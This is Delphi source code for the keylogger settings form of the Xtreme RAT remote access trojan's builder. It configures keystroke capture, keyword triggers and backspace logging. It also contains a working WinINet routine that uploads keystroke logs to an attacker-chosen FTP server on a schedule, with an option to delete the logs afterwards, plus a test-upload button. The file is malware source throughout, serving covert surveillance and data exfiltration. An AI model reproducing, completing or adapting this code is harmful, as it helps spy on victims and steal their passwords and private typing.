unit UnitKeyloggerSettings;

interface

uses
  StrUtils,Windows, Messages, UnitFuncoesDiversas, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ImgList, Buttons, StdCtrls, ExtCtrls, sPanel, unitMain;

type
  TFormKeyloggerSettings = class(TForm)
    MainPanel: TsPanel;
    Label1: TLabel;
    Label2: TLabel;
    Label3: TLabel;
    Label4: TLabel;
    SpeedButton1: TSpeedButton;
    Label5: TLabel;
    Label6: TLabel;
    Label7: TLabel;
    Label8: TLabel;
    Label9: TLabel;
    CheckBox3: TCheckBox;
    CheckBox4: TCheckBox;
    CheckBox5: TCheckBox;
    Edit1: TEdit;
    Edit2: TEdit;
    Edit3: TEdit;
    Edit4: TEdit;
    CheckBox1: TCheckBox;
    Edit5: TEdit;
    ComboBox1: TComboBox;
    CheckBox2: TCheckBox;
    ImageList1: TImageList;
    procedure FormCreate(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure CheckBox3Click(Sender: TObject);
    procedure CheckBox1Click(Sender: TObject);
    procedure CheckBox5Click(Sender: TObject);
    procedure SpeedButton1Click(Sender: TObject);
    procedure Edit5KeyPress(Sender: TObject; var Key: Char);
    procedure Edit1KeyPress(Sender: TObject; var Key: Char);
  private
    { Private declarations }
	procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
  public
    { Public declarations }
    procedure AtualizarIdiomas;
  end;

var
  FormKeyloggerSettings: TFormKeyloggerSettings;

implementation

{$R *.dfm}

uses
  UnitStrings,
  UnitConstantes,
  UnitCommonProcedures,
  UnitConfigs;

//procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
procedure TFormKeyloggerSettings.WMAtualizarIdioma(var Message: TMessage);
begin
  AtualizarIdiomas;
end;  

type
  TSendFTPFile = class(TThread)
  private
    FTPAddress: WideString;
    FTPDir: WideString;
    FTPUser: WideString;
    FTPPass: WideString;
    FTPRemoteName: WideString;
    FTPLocalName: WideString;
  protected
    procedure Execute; override;
  public
    constructor Create(xFTPAddress: WideString;
                       xFTPDir: WideString;
                       xFTPUser: WideString;
                       xFTPPass: WideString;
                       xFTPRemoteName: WideString;
                       xFTPLocalName: WideString);
  end;

function IntToStr(i: Int64): WideString;
begin
  Str(i, Result);
end;

function HTMLEncode(Data: WideString): WideString;
begin
  if Data = '' then Result := '' else
    Result:=
      UTF8Decode(
      StringReplace(
      StringReplace(
      StringReplace(
      StringReplace(
      StringReplace(
      UTF8Encode(
        Data),
        '&','&amp;',[rfReplaceAll]),
        '<','&lt;',[rfReplaceAll]),
        '>','&gt;',[rfReplaceAll]),
        '"','&quot;',[rfReplaceAll]),
        #13#10,'<br />' + #13#10,[rfReplaceAll])
      );
end;

function ShowTime(DayChar: WideChar = '/'; DivChar: WideChar = ' ';
  HourChar: WideChar = ':'): WideString;
var
  SysTime: TSystemTime;
  Month, Day, Hour, Minute, Second: WideString;
begin
  GetLocalTime(SysTime);
  Month := inttostr(SysTime.wMonth);
  Day := inttostr(SysTime.wDay);
  Hour := inttostr(SysTime.wHour);
  Minute := inttostr(SysTime.wMinute);
  Second := inttostr(SysTime.wSecond);
  if length(Month) = 1 then Month := '0' + Month;
  if length(Day) = 1 then Day := '0' + Day;
  if length(Hour) = 1 then Hour := '0' + Hour;
  if Hour = '24' then Hour := '00';
  if length(Minute) = 1 then Minute := '0' + Minute;
  if length(Second) = 1 then Second := '0' + Second;
  Result := Day + DayChar + Month + DayChar + inttostr(SysTime.wYear)
    + DivChar + Hour + HourChar + Minute + HourChar + Second;
end;

Procedure CriarArquivo(NomedoArquivo: String; imagem: string; Size: DWORD);
var
  hFile: THandle;
  lpNumberOfBytesWritten: DWORD;
begin
  hFile := CreateFile(PChar(NomedoArquivo), GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, 0, 0);

  if hFile <> INVALID_HANDLE_VALUE then
  begin
    if Size = INVALID_HANDLE_VALUE then
    SetFilePointer(hFile, 0, nil, FILE_BEGIN);
    WriteFile(hFile, imagem[1], Size, lpNumberOfBytesWritten, nil);
    CloseHandle(hFile);
  end;
end;

function ToUnicodeEx(wVirtKey, wScanCode: UINT; lpKeyState: TKeyboardState;
  pwszBuff: PWideChar; cchBuff: Integer; wFlags: UINT; dwhkl: HKL): Integer; stdcall; external user32 name 'ToUnicodeEx';
function GetKeyboardState(var KeyState: TKeyboardState): BOOL; stdcall; external user32 name 'GetKeyboardState';
function InternetConnectW(hInet: Pointer; lpszServerName: PWideChar;
  nServerPort: Word; lpszUsername: PWideChar; lpszPassword: PWideChar;
  dwService: DWORD; dwFlags: DWORD; dwContext: DWORD): Pointer; stdcall; external 'wininet.dll' name 'InternetConnectW';
function InternetOpenW(lpszAgent: PWideChar; dwAccessType: DWORD;
  lpszProxy, lpszProxyBypass: PWideChar; dwFlags: DWORD): Pointer; stdcall; external 'wininet.dll' name 'InternetOpenW';
function FtpSetCurrentDirectoryW(hConnect: Pointer; lpszDirectory: PWideChar): BOOL; stdcall; external 'wininet.dll' name 'FtpSetCurrentDirectoryW';
function FtpPutFileW(hConnect: Pointer; lpszLocalFile: PWideChar;
  lpszNewRemoteFile: PWideChar; dwFlags: DWORD; dwContext: DWORD): BOOL; stdcall; external 'wininet.dll' name 'FtpPutFileW';
function InternetCloseHandle(hInet: Pointer): BOOL; stdcall; external 'wininet.dll' name 'InternetCloseHandle';

function upload_file(remote_server, //by Rot1
                     directory,
                     local_file,
                     remote_file,
                     user,
                     pass: PWideChar): boolean;
var
  hInet, hConnect: Pointer;
  Dir, Put: Boolean;
begin
  try
    hInet := InternetOpenW(nil, 1, nil, nil, 0);
    hConnect := InternetConnectW(hInet,
                                 remote_server,
                                 21,
                                 user,
                                 pass,
                                 1,
                                 $08000000,
                                 0);
    Dir := ftpSetCurrentDirectoryW(hConnect, directory);
    WaitForSingleObject(Cardinal(Dir), infinite);
    Put := ftpPutFileW(hConnect, local_file, remote_file, $00000002, 0);
    InternetCloseHandle(hInet);
    InternetCloseHandle(hConnect);
    Result:= Put;
    except
    Result := False;
  end;
end;

procedure TFormKeyloggerSettings.AtualizarIdiomas;
begin
  CheckBox3.Caption := Traduzidos[66];
  CheckBox4.Caption := Traduzidos[67];
  CheckBox5.Caption := Traduzidos[68];
  Label1.Caption := Traduzidos[69] + ':';
  Label2.Caption := Traduzidos[70] + ':';
  Label3.Caption := Traduzidos[71] + ':';
  Label4.Caption := Traduzidos[72] + ':';
  Label7.Caption := Traduzidos[73] + ':';
  Label8.Caption := Traduzidos[74] + ':';
  Label5.Caption := Traduzidos[75] + ':';
  Label6.Caption := Traduzidos[76] + ':';
  CheckBox1.Caption := Traduzidos[47];
  CheckBox2.Caption := Traduzidos[92];
  Label9.Caption := Traduzidos[123];
end;

procedure TFormKeyloggerSettings.CheckBox1Click(Sender: TObject);
begin
  if TCheckBox(sender).Checked then Edit4.PasswordChar := #0 else
  Edit4.PasswordChar := '*';
end;

procedure TFormKeyloggerSettings.CheckBox3Click(Sender: TObject);
var
  b: boolean;
begin
  b := TCheckBox(sender).Checked;
  CheckBox4.Enabled := b;
  CheckBox5.Enabled := b;
  Edit5.Enabled := b;
  Edit1.Enabled := b and CheckBox5.Checked;
  b := Edit1.Enabled;
  Edit2.Enabled := b;
  Edit3.Enabled := b;
  Edit4.Enabled := b;
  ComboBox1.Enabled := b;
  CheckBox1.Enabled := b;
  CheckBox2.Enabled := b;
  SpeedButton1.Visible := b;
end;

procedure TFormKeyloggerSettings.CheckBox5Click(Sender: TObject);
var
  b: boolean;
begin
  b := TCheckBox(sender).Checked;
  Edit1.Enabled := b;
  Edit2.Enabled := b;
  Edit3.Enabled := b;
  Edit4.Enabled := b;
  ComboBox1.Enabled := b;
  CheckBox1.Enabled := b;
  CheckBox2.Enabled := b;
  SpeedButton1.Visible := b;
end;

function CharCount(Str: WideString; C: WideChar): integer;
var
  s: widestring;
begin
  Result := 0;
  s := Str;
  while posex(c, s) > 0 do
  begin
    inc(result);
    delete(s, 1, posex(c, s));
  end;
end;

procedure TFormKeyloggerSettings.Edit1KeyPress(Sender: TObject; var Key: Char);
begin
  if CheckValidName(Key) = False then Key := #0;
end;

procedure TFormKeyloggerSettings.Edit5KeyPress(Sender: TObject; var Key: Char);
begin
  if CharCount(Edit5.Text, ';') >= 10 then key := #0;
end;

procedure TFormKeyloggerSettings.FormCreate(Sender: TObject);
begin
  Self.Left := (screen.width - Self.width) div 2 ;
  Self.top := (screen.height - Self.height) div 2;
  ImageList1.GetBitmap(0, SpeedButton1.Glyph);
  Edit1.MaxLength := (SizeOf(ConfiguracoesServidor.FTPAddress) div 2) - 1;
  Edit2.MaxLength := (SizeOf(ConfiguracoesServidor.FTPUser) div 2) - 1;
  Edit3.MaxLength := (SizeOf(ConfiguracoesServidor.FTPFolder) div 2) - 1;
  Edit4.MaxLength := (SizeOf(ConfiguracoesServidor.FTPPass) div 2) - 1;
  Edit1.MaxLength := (SizeOf(ConfiguracoesServidor.RecordWords) div 2) - 1;
end;

procedure TFormKeyloggerSettings.FormDestroy(Sender: TObject);
begin
  ConfiguracoesServidor.ActiveKeylogger := CheckBox3.Checked;
  ConfiguracoesServidor.KeyDelBackspace := CheckBox4.Checked;
  ConfiguracoesServidor.SendFTPLogs := CheckBox5.Checked;

  ConfiguracoesServidor.FTPAddress := StrToArray(Edit1.Text);
  ConfiguracoesServidor.FTPUser := StrToArray(Edit2.Text);
  ConfiguracoesServidor.FTPFolder := StrToArray(Edit3.Text);
  ConfiguracoesServidor.FTPPass := StrToArray(Edit4.Text);
  ConfiguracoesServidor.RecordWords := StrToArray(Edit5.Text);

  ConfiguracoesServidor.FTPFreq := ComboBox1.ItemIndex;
  ConfiguracoesServidor.FTPDelLogs := CheckBox2.Checked;
end;

procedure TFormKeyloggerSettings.FormShow(Sender: TObject);
begin
  AtualizarIdiomas;

  CheckBox3.Checked := ConfiguracoesServidor.ActiveKeylogger;
  CheckBox4.Checked := ConfiguracoesServidor.KeyDelBackspace;
  CheckBox5.Checked := ConfiguracoesServidor.SendFTPLogs;

  Edit1.Text := ConfiguracoesServidor.FTPAddress;
  Edit2.Text := ConfiguracoesServidor.FTPUser;
  Edit3.Text := ConfiguracoesServidor.FTPFolder;
  Edit4.Text := ConfiguracoesServidor.FTPPass;
  Edit5.Text := ConfiguracoesServidor.RecordWords;

  ComboBox1.ItemIndex := ConfiguracoesServidor.FTPFreq;
  CheckBox2.Checked := ConfiguracoesServidor.FTPDelLogs;

  CheckBox1.Checked := False;
end;

procedure TFormKeyloggerSettings.SpeedButton1Click(Sender: TObject);
var
  SendFTPFile: TSendFTPFile;
  s: WideString;
  FileName, FullFileName: WideString;
  Janela: Widestring;
begin
  Janela := NomeDoPrograma + ' ' + VersaoDoPrograma;
  janela := '<FONT COLOR="blue">[' + HTMLEncode(Janela) + ']' + ' --- ' + ShowTime + '</font>' + HTMLEncode(#13#10);
  S := janela + HTMLEncode(Traduzidos[107]);
  S := '<html>' + #13#10 +
                '<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">' + #13#10 +
                '<head>' + #13#10 +
                '<title>Xtreme RAT</title>' + #13#10 +
                '</head>' + #13#10 +
                '<body>' + s + '</body>' + #13#10 +
                '</html>';

  FileName := 'keylogger_ftp_test.html';
  FullFileName := MyTempFolder + IntToStr(random(9999)) + '.html';
  CriarArquivo(FullFileName, s, Length(s) * 2);

  SendFTPFile := TSendFTPFile.Create(Edit1.Text,
                                     './' + Edit3.Text,
                                     Edit2.Text,
                                     Edit4.Text,
                                     FileName,
                                     FullFileName);
  SendFTPFile.Resume;
end;

constructor TSendFTPFile.Create(xFTPAddress: WideString; xFTPDir: WideString; xFTPUser: WideString; xFTPPass: WideString; xFTPRemoteName: WideString; xFTPLocalName: WideString);
begin
  FTPAddress := xFTPAddress;
  FTPDir := xFTPDir;
  FTPUser := xFTPUser;
  FTPPass := xFTPPass;
  FTPRemoteName := xFTPRemoteName;
  FTPLocalName := xFTPLocalName;
  inherited Create(True);
end;

procedure TSendFTPFile.Execute;
begin
  if upload_file(pWideChar(FTPAddress),
                 pWideChar(FTPDir),
                 pWideChar(FTPLocalName),
                 pWideChar(FTPRemoteName),
                 pWideChar(FTPUser),
                 pWideChar(FTPPass)) then
  MessageBoxW(Handle, pWideChar(Traduzidos[105]), pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma), MB_ICONINFORMATION) else
  MessageBoxW(Handle, pWideChar(Traduzidos[106]), pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma), MB_ICONERROR);
  DeleteFile(FTPLocalName);
end;

end.
